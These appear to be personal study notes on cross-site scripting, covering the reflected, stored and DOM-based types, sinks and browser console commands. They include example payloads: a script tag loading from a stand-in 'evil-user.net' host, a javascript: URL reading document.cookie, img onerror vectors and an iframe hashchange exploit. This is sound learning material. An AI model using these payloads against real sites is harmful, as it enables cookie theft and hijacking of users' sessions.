=> What is cross-site scripting (XSS)?
XSS is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy,
which is designed to segregate different websites from each other.

=> How does XSS work?
XSS works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code execute inside a victim's browser, the attacker can compromise their interaction
with the application. 

Example: https://insecure-website.com/comment?message=<script src=https://evil-user.net/badscript.js></script>

=> XSS Proof of concept
alert()
print()

=> Types of XSS attacks?

1: Reflected XSS (It reflects the query result immediately)
2: Stored XSS (It store the query in database and wait until executed by user visiting the page like 'post comment'
3: DOM-based XSS (It is used to manipulate the HTML of the page called DOM)

-> Reflected XSS: is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an
unsafe way.

--------------------Reflected XSS------------------------------------
https://insecure-website.com/status?message=All+is+well.
<p>status: all is well.</p> 

The applicationi doesn't perform any other processing of the data, so an attacker can easily construct an attack like this:

https://insecure-website.com/status?message=<script>/*+bad+stuff+here...+*/</script>
<p>status: <script>/* bad stuff here--*/</script></p>

-----------------Stored XSS----------------------------
<script>alert('you are hacked')</script>

For example, when you add the query in comment of any post.


-----------------DOM XSS ----------------------------
<img src="unsecure.com/resources/images/product?searchitem=hackyou" onload="alert()>

Added DOM XSS query=> hackyou" onload="alert()

Question: what is sink like document.write sink | innerHTML sink

------------------DOM XSS----------------------------
http://....../returnpath=/ (we can do that http://......./returnpath=javascript:alert(document.cookie)

If we directly pass '<script>alert(3)</script> would not be executed because it is part of security so we need to pass something like <img src='0' onerror=alert(1)>. It is not compulsory to 
pass <img> tag, can be pass something else. 
-----------------------------------------------------

View source code vs Script 

View source code does not show DOM manipulation, only show real source code retrive from server. But script code showes DOM manipulation. 


------------------DOM XSS in jQuery selector sink using a hashchange event------------------------

example: https://test.com?query=product

Above command will return the output related to 'product' through '?query' search. In this case if I want to get hacked user cookies, they need to click on the click to make the query executable.

Is there are any way to execute the link without clicking?

Yes, we need to draft the URL in '<iframe></iframe>' in which includes '<img> tag.

kali> <iframe src="https://test-website.com/#" onload="this.src+='<img src=145 onerror=print()>'"</iframe>


important commands for console (chrome):
window.location (will return website's URL)
location.search (will return the query like '?query=product" from https://test-website.com?query=search)
location.hash (will return query after '#' like 'product' from https://test-website.com#product)
